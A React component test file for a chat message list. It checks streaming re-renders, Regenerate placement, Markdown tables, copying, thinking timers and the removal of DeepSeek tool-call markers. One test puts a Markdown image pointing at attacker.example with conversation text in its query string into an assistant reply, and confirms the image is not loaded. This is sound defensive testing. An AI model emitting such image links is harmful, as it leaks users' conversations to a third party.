import {
    act,
    cleanup,
    fireEvent,
    render,
    waitFor,
} from "@testing-library/react"
import { createElement } from "react"
import { afterEach, describe, expect, it, vi } from "vitest"
import { LocaleProvider } from "@/components/canvas/locale-context"
import { MessageList } from "@/components/chat/message-list"
import { DictionaryProvider } from "@/hooks/use-dictionary"
import type { Dictionary } from "@/lib/i18n/dictionaries"
import en from "@/lib/i18n/dictionaries/en.json"

afterEach(() => {
    cleanup()
    vi.restoreAllMocks()
    vi.useRealTimers()
})

// jsdom has no scrolling; the list scrolls to its newest message
Element.prototype.scrollIntoView = vi.fn()

// The engine as the list reads it: each test sets its messages and status
const engine = vi.hoisted(() => ({ current: {} as any }))
vi.mock("@/components/chat/chat-engine", () => ({
    useChatEngine: () => engine.current,
}))

// The real Markdown, with a note of each text it parses
const parsed = vi.hoisted(() => [] as string[])
vi.mock("react-markdown", async (importOriginal) => {
    const real = await importOriginal<typeof import("react-markdown")>()
    return {
        default: (props: { children: string }) => {
            parsed.push(props.children)
            return createElement(real.default, props)
        },
    }
})

const user = (id: string, text: string) => ({
    id,
    role: "user",
    parts: [{ type: "text", text }],
})

const assistant = (id: string, parts: object[], metadata?: object) => ({
    id,
    role: "assistant",
    parts: [{ type: "step-start" }, ...parts],
    metadata,
})

const text = (text: string) => ({ type: "text", text })

/** The card of a failed request */
const notice = (id: string, text: string) => ({
    id,
    role: "assistant",
    parts: [{ type: "data-notice", data: { text } }],
})

const usage = {
    inputTokens: 6114,
    outputTokens: 1429,
    cacheReadTokens: 0,
    reasoningTokens: 0,
    durationMs: 10200,
}

function setEngine(messages: object[], overrides: object = {}) {
    engine.current = {
        messages,
        status: "ready",
        isBusy: false,
        // Messages of a saved chat: shown without the entry animation
        loadedMessageIdsRef: {
            current: new Set(messages.map((m: any) => m.id)),
        },
        reasoningSecondsRef: { current: new Map() },
        stoppedRef: { current: false },
        validationStates: {},
        langfuseSessionId: "session-1",
        regenerate: vi.fn(),
        retryLastMessage: vi.fn(),
        editMessage: vi.fn(),
        improveWithSuggestions: vi.fn(),
        ...overrides,
    }
}

const list = () => (
    <DictionaryProvider dictionary={en as unknown as Dictionary}>
        <LocaleProvider locale="en">
            <MessageList />
        </LocaleProvider>
    </DictionaryProvider>
)

describe("MessageList", () => {
    it("renders only the answer that streams again on its next chunk", () => {
        const earlier = [
            user("u1", "First question"),
            assistant("a1", [text("First answer.")], { usage }),
            user("u2", "Second question"),
        ]
        setEngine([...earlier, assistant("a2", [text("Second")])], {
            status: "streaming",
            isBusy: true,
        })
        const view = render(list())
        expect(view.container.textContent).toContain("First answer.")
        expect(view.getByTestId("reply-usage").textContent).toContain("6,114")

        parsed.length = 0
        // "format" is a getter (it returns the bound function)
        const formatted = vi.spyOn(
            Intl.NumberFormat.prototype as any,
            "format",
            "get",
        )
        setEngine([...earlier, assistant("a2", [text("Second answer")])], {
            status: "streaming",
            isBusy: true,
        })
        view.rerender(list())
        expect(view.container.textContent).toContain("Second answer")
        // Not the earlier messages' Markdown, nor the numbers of the usage
        // note under the first answer
        expect(parsed).toEqual(["Second answer"])
        expect(formatted).not.toHaveBeenCalled()
    })

    it("offers Regenerate only under the answer to the newest question", () => {
        const regenerate = { name: "Regenerate response" }
        // The second question failed before any answer: Regenerate under
        // the first answer would drop the second question
        setEngine([
            user("u1", "First question"),
            assistant("a1", [text("First answer.")]),
            user("u2", "Second question"),
            notice("n1", "Internal server error"),
        ])
        const failed = render(list())
        expect(failed.getByTestId("retry-button")).toBeTruthy()
        expect(failed.queryByRole("button", regenerate)).toBeNull()
        cleanup()

        // An answer that an error cut off is still the newest question's
        setEngine([
            user("u1", "First question"),
            assistant("a1", [text("First ans")]),
            notice("n1", "Internal server error"),
        ])
        const cutOff = render(list())
        expect(cutOff.getByRole("button", regenerate)).toBeTruthy()
    })

    it("shows a table the answer wrote as a table", () => {
        setEngine([
            user("u1", "Which parts are there?"),
            assistant("a1", [
                text(
                    "Here are the parts:\n\n| Part | Role |\n| --- | --- |\n| Browser | sends the form |\n\nEach box is ~200~300 px wide, ~~not more~~.",
                ),
            ]),
        ])
        const { container, getByRole } = render(list())
        expect(getByRole("table").textContent).toBe(
            "PartRoleBrowsersends the form",
        )
        // Only a doubled "~" strikes text out
        expect(container.querySelector("del")?.textContent).toBe("not more")
        expect(container.textContent).toContain("~200~300 px")
    })

    it("shows a picture the answer points to as a link, without loading it", () => {
        const address =
            "https://attacker.example/log?d=the%20earlier%20messages"
        setEngine([
            user("u1", "Summarize the page"),
            assistant("a1", [text(`Done. ![the plan](${address})`)]),
        ])
        const { container, getByRole } = render(list())
        expect(container.textContent).toContain("Done.")
        expect(container.querySelector("img")).toBeNull()
        expect(
            getByRole("link", { name: "the plan" }).getAttribute("href"),
        ).toBe(address)
    })

    it("copies a question as typed, without the text of its attached files", async () => {
        const writeText = vi.fn().mockResolvedValue(undefined)
        Object.defineProperty(navigator, "clipboard", {
            value: { writeText },
            configurable: true,
        })
        setEngine([
            user(
                "u1",
                "Draw the main ideas of this page.\n\n[URL: https://example.com/a]\nTitle: Example\n\nSix thousand characters of the page",
            ),
            assistant("a1", [text("Here they are.")]),
        ])
        const { getAllByRole } = render(list())
        // The first is the question's, the second the answer's
        const [question, answer] = getAllByRole("button", {
            name: "Copy response",
        })
        fireEvent.click(question)
        await waitFor(() =>
            expect(writeText).toHaveBeenLastCalledWith(
                "Draw the main ideas of this page.",
            ),
        )
        fireEvent.click(answer)
        await waitFor(() =>
            expect(writeText).toHaveBeenLastCalledWith("Here they are."),
        )
    })

    it("leaves out the tool call marker DeepSeek ends its text with", async () => {
        const writeText = vi.fn().mockResolvedValue(undefined)
        Object.defineProperty(navigator, "clipboard", {
            value: { writeText },
            configurable: true,
        })
        // The bars are the fullwidth U+FF5C; one marker before each call
        const bar = String.fromCharCode(0xff5c)
        const marker = `\n\n<${bar}DSML${bar}function_calls`
        setEngine([
            user("u1", "Draw the steps"),
            assistant("a1", [
                text(`I will draw four steps.${marker}`),
                { type: "step-start" },
                text(`Now with labels.${marker}`),
            ]),
        ])
        const { container, getAllByRole } = render(list())
        expect(container.textContent).toContain("I will draw four steps.")
        expect(container.textContent).toContain("Now with labels.")
        expect(container.textContent).not.toContain("DSML")
        fireEvent.click(getAllByRole("button", { name: "Copy response" })[1])
        await waitFor(() =>
            expect(writeText).toHaveBeenLastCalledWith(
                "I will draw four steps.\nNow with labels.",
            ),
        )
    })

    it("counts the seconds of the wait and of the thinking from the request's start", () => {
        vi.useFakeTimers()
        const question = user("u1", "Draw a hiring process with 20 steps")
        const answering = { status: "streaming", isBusy: true }
        setEngine([question], { status: "submitted", isBusy: true })
        const view = render(list())
        expect(view.container.textContent).toContain("Thinking...")
        act(() => {
            vi.advanceTimersByTime(99_000)
        })
        expect(view.container.textContent).toContain("Thinking... 99 s")

        // Claude on Bedrock: the thinking arrives when it is over, without
        // its text, and the answer's text right behind it
        const thinking = { type: "reasoning", text: "" }
        setEngine([question, assistant("a1", [thinking])], answering)
        view.rerender(list())
        expect(view.container.textContent).toContain("Thinking... 99 s")
        act(() => {
            vi.advanceTimersByTime(150)
        })
        setEngine(
            [question, assistant("a1", [thinking, text("Here it is.")])],
            answering,
        )
        view.rerender(list())
        expect(view.container.textContent).toContain("Thought for 100 seconds")
        // Without text there is nothing to open: no button, no arrow
        expect(view.queryByRole("button", { name: /Thought for/ })).toBeNull()
    })

    it("opens the thinking that came with its text", () => {
        setEngine([
            user("u1", "Draw two boxes"),
            assistant("a1", [
                { type: "reasoning", text: "Plan the boxes" },
                text("Done"),
            ]),
        ])
        const { getByRole, queryByText } = render(list())
        expect(queryByText("Plan the boxes")).toBeNull()
        fireEvent.click(getByRole("button", { name: /Thought for/ }))
        expect(queryByText("Plan the boxes")).not.toBeNull()
    })
})
